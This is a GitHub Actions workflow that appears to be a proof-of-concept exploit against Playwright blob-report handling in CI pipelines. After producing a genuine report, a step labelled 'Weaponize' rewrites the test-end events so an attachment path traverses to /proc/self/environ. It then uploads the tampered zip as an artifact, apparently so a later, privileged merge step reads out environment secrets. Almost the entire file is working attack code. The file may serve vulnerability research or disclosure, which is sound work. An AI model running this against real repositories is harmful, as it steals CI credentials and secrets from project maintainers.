# trigger run 3
name: tests others

on:
  pull_request:

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - name: Generate a genuine blob report
        run: |
          npm init -y >/dev/null 2>&1
          npm install -D @playwright/test@1.50.0 --no-audit --no-fund
          mkdir -p tests
          cat > tests/a.spec.js <<'EOF'
          const { test } = require('@playwright/test');
          test('poc', () => {});
          EOF
          npx playwright test tests/a.spec.js --reporter=blob
          ls -la blob-report
      - name: Weaponize the blob report (attacker-controlled artifact content)
        run: |
          python3 - <<'PY'
          import glob, json, zipfile
          src = glob.glob('blob-report/*.zip')[0]
          dst = 'blob-report-1.zip'
          zin = zipfile.ZipFile(src)
          items = [(i.filename, zin.read(i.filename)) for i in zin.infolist()]
          zin.close()
          out = []
          for name, data in items:
              if name.endswith('.jsonl'):
                  lines = []
                  for line in data.decode().splitlines():
                      if not line.strip():
                          continue
                      ev = json.loads(line)
                      if ev.get('method') == 'onTestEnd':
                          ev['params']['result']['attachments'] = [{
                              'name': 'leak.txt',
                              'contentType': 'text/plain',
                              'path': '../../../../../../../../proc/self/environ',
                          }]
                      lines.append(json.dumps(ev))
                  data = ('\n'.join(lines) + '\n').encode()
              out.append((name, data))
          with zipfile.ZipFile(dst, 'w') as z:
              for name, data in out:
                  z.writestr(name, data)
          print('wrote', dst, [n for n, _ in out])
          PY
      - uses: actions/upload-artifact@v4
        with:
          name: blob-report-1
          path: blob-report-1.zip
